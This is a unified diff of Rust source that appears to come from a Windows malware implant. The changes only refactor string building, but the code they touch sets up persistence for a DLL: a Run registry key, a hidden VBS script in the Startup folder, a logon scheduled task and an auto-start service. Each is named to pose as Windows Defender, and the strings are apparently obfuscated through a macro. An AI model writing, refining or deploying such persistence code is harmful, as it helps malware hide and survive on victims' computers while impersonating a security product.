@@ -76,14 +76,14 @@ fn dll_persistence(dll_path: &Path) -> std::io::Result<()> {
 
     let hkcu = RegKey::predef(enums::HKEY_CURRENT_USER);
     if let Ok((key, _)) = hkcu.create_subkey(astr!("Software\\Microsoft\\Windows\\CurrentVersion\\Run")) {
-        let rundll_cmd = astr!("rundll32.exe \"") + &dll_str + astr!("\",NetClientMain");
+        let rundll_cmd = format!("{}{}{}", astr!("rundll32.exe \""), &dll_str, astr!("\",NetClientMain"));
         let _ = key.set_value(astr!("WindowsDefender"), &rundll_cmd);
     }
 
     if let Ok(appdata) = env::var(astr!("APPDATA")) {
         let startup = Path::new(&appdata).join(astr!("Microsoft\\Windows\\Start Menu\\Programs\\Startup"));
         let _ = fs::create_dir_all(&startup);
-        let vbs = astr!("Set WShell = CreateObject(\"WScript.Shell\")\nWShell.Run \"rundll32.exe \"\"") + &dll_str + astr!("\"\",NetClientMain\", 0, False\n");
+        let vbs = format!("{}{}{}", astr!("Set WShell = CreateObject(\"WScript.Shell\")\nWShell.Run \"rundll32.exe \"\""), &dll_str, astr!("\"\",NetClientMain\", 0, False\n"));
         let _ = fs::write(startup.join(astr!("defender.vbs")), vbs);
     }
 
@@ -105,7 +105,7 @@ fn scheduled_task(target_path: &Path) {
             astr!("/tn"),
             astr!("WindowsDefender"),
             astr!("/tr"),
-            &path_str,
+            path_str,
             astr!("/sc"),
             astr!("onlogon"),
             astr!("/rl"),
@@ -126,7 +126,7 @@ fn windows_service(target_path: &Path) {
             astr!("create"),
             astr!("WindowsDefender"),
             astr!("binPath="),
-            &path_str,
+            path_str,
             astr!("start="),
             astr!("auto"),
         ])
